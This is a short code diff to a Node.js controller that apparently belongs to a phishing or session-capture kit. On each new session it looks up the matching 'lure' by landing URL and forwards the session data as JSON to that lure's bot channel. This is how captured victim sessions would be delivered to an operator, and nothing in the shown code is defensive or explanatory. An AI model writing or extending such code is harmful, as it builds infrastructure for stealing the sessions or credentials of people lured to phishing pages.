@@ -1,4 +1,6 @@
 const sessionService = require("../service/session");
+const lureService = require("../service/lure");
+const bot = require("../service/bot");
 
 const resolve = (data, res) => {
   return res.status(200).send({
@@ -16,13 +18,28 @@ const reject = (err, res) => {
 };
 
 exports.create = (req, res) => {
-  console.log(req.body);
   sessionService
     .create(req.body)
-    .then((data) => resolve(data, res))
+    .then((data) => {
+      lureService
+        .findOne({ landingUrl: data.landingUrl })
+        .then((lure) => {
+          try {
+            data = data.toJSON();
+            delete data.id;
+            delete data.updatedAt;
+            bot.sendMessage(lure.channel, JSON.stringify(data));
+            resolve({}, res);
+          } catch (err) {
+            reject(err, res);
+          }
+        })
+        .catch((err) => reject(err, res));
+    })
     .catch((err) => reject(err, res));
 };
-exports.remove = (req, res) => {
+
+exports.delete = (req, res) => {
   sessionService
     .remove(req.body.id)
     .then((data) => resolve(data, res))
